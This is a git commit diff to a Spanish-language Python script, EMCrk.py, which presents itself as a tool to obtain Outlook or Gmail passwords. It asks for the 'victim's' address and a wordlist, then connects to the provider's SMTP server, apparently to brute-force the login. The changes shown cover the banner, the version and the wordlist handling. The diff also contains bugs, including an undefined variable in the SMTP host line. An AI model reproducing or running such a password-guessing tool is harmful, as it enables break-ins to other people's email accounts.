b452f6e0b9d2a02b9020149108e972de124fbbf3
Lawliet <jerry_howl_lawliet@hotmail.com>
2017-01-21 01:12:00 -0600

    Diccionario
    Se añadio una mejor forma de peticion de Diccionario

--- EMCrk.py
+++ EMCrk.py
@@ -1,13 +1,14 @@
 # -*- coding: utf-8 -*-
-#                                          
-#           ______ __  __  _____      _    
-#          |  ____|  \/  |/ ____|    | |   
-#          | |__  | \  / | |     _ __| | __
-#          |  __| | |\/| | |    | '__| |/ /
-#          | |____| |  | | |____| |  |   < 
-#          |______|_|  |_|\_____|_|  |_|\_\\
-#                                          
-#                                     By: LawlietJH
+#                                                               
+#        `7MM'""YMM  `7MMM.     ,MMF' .g8'""bgd       `7MM      
+#          MM    `7    MMMb    dPMM .dP'     `M         MM      
+#          MM   d      M YM   ,M MM dM'       ``7Mb,od8 MM  ,MP'
+#          MMmmMM      M  Mb  M' MM MM           MM' "' MM ;Y   
+#          MM   Y  ,   M  YM.P'  MM MM.          MM     MM;Mm   
+#          MM     ,M   M  `YM'   MM `Mb.     ,'  MM     MM `Mb. 
+#        .JMMmmmmMMM .JML. `'  .JMML. `"bmmmd' .JMML. .JMML. YA.
+#                                                               
+#                                                  By: LawlietJH
 
 from BannerEMCrk import Banner
 import os.path as path
@@ -17,7 +18,7 @@ import os
 os.system('cls')
 
 autor = "By: LawlietJH"
-version = "v_1.0.1"
+version = "v_1.0.2"
 
     #GMCrk - Banner Random
 banner = str(Banner()+"\n\n\t\t [-] Obtener Contraseñas de Outlook o Gmail [-] \n\n")
@@ -36,12 +37,12 @@ Usuario = input("\n\n [+] Dirección de Correo de la Víctima: ")
     
     
 if Usuario.lower().endswith('@gmail.com'):
-	pagina = "gmail"
+	correo = "gmail"
 elif Usuario.lower().endswith('@hotmail.com'):
-	pagina = "outlook"
+	correo = "outlook"
 else:
 	print("\n\t\t [!] Correo No Valido.")
-	#os.system('Timeout /nobreak 02 > Nul')
+	os.system('Timeout /nobreak 02 > Nul')
 	exit(0)
 
 
@@ -51,18 +52,42 @@ NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")
 	#Comprobamos Si Existe El Diccionario
 if path.exists(NombreA):
 	Archivo = NombreA
-else:
+elif NombreA == "":
 	Archivo = "pwd.zion"
 	print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
 	os.system('Timeout /nobreak 02 > Nul')
+	
 	if not path.exists("pwd.zion"):
 		print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
 		os.system('Timeout /nobreak 02 > Nul')
 		exit(0)
+else:
+	print("\n\t No se encontro el Diccionario: "+NombreA)
+	print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
+	Archivo = "pwd.zion"
+	os.system('Timeout /nobreak 02 > Nul')
+	
+	if not path.exists("pwd.zion"):
+		print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
+		resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
+		
+		if resp == "":
+			resp = "N"
+			
+		if resp == "S" or resp == "Si" or resp == "SI" or resp == "si":
+			print("\n\t Se creará el archivo pwd.zion.")
+			print("\n\t Puedes añadirle palabras desde bloc de notas.")
+			Zion=open("pwd.zion","w")
+			Zion.close
+			os.system('Timeout /nobreak 02 > Nul')
+			exit(0)
+		else:
+			os.system('Timeout /nobreak 02 > Nul')
+			exit(0)
 
 
 	#SMTP Puerto 587/TCP (Para Clientes de Correo)
-smtpserver = smtplib.SMTP("smtp."+str(pagina)+".com", 587)
+smtpserver = smtplib.SMTP("smtp."+str(nombre)+".com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
